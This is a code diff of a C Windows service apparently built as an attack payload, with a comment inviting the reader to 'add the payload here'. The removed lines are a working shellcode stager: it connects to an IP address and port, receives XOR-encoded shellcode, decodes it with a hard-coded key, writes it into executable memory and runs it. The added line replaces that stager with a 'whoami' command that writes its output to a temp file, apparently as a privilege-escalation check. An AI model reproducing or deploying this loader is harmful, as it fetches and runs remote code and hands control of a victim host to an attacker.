@@ -1,16 +1,7 @@
 #include <windows.h>
 #include <stdio.h>
 
-#include <stdlib.h>
-#include <unistd.h>
-
-#include <Winsock2.h>
-//compilation
-//-lwsock32
-
-
 #define SLEEP_TIME 5000
-#define BUFFER_SIZE 1024
 
 SERVICE_STATUS ServiceStatus; 
 SERVICE_STATUS_HANDLE hStatus; 
@@ -21,49 +12,7 @@ void ControlHandler(DWORD request);
 //add the payload here
 int Run() 
 { 
-    int port = 9002;
-    
-    char ip[] = "10.11.80.155";
-    //char ip[] = "127.0.0.1";
-
-    WSADATA WSAData;
-    WSAStartup(MAKEWORD(2,0), &WSAData);
-
-    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
-    struct sockaddr_in serv_addr;
-    serv_addr.sin_family = AF_INET;
-    serv_addr.sin_port = htons(port);
-
-    //inet_aton(ip, &serv_addr.sin_addr);
-    serv_addr.sin_addr.s_addr = inet_addr(ip);
-
-
-    int n = connect(sockfd, (struct sockaddr *)&serv_addr, sizeof(serv_addr));
-
-    unsigned char buffer[BUFFER_SIZE];
-
-    n = recv(sockfd, buffer, BUFFER_SIZE, 0);
-    printf("n=%d\n\n", n);
-    
-    closesocket(sockfd);
-    WSACleanup();
-
-
-    char key[] = "YoloSpaceHacker";
-    unsigned char shellcode[n];
-
-    for (int i = 0; i < n; i++)
-    {
-        //printf("%02x", buffer[i]);
-        shellcode[i] = buffer[i] ^ key[i % strlen(key)];
-    }
-
-    //(*(void (*)()) shellcode)();
-
-    void *exec = VirtualAlloc(0, sizeof shellcode, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
-    memcpy(exec, shellcode, sizeof shellcode);
-    ((void(*)())exec)();
-
+    system("whoami > c:\\windows\\temp\\service.txt");
     return 0; 
 } 
 
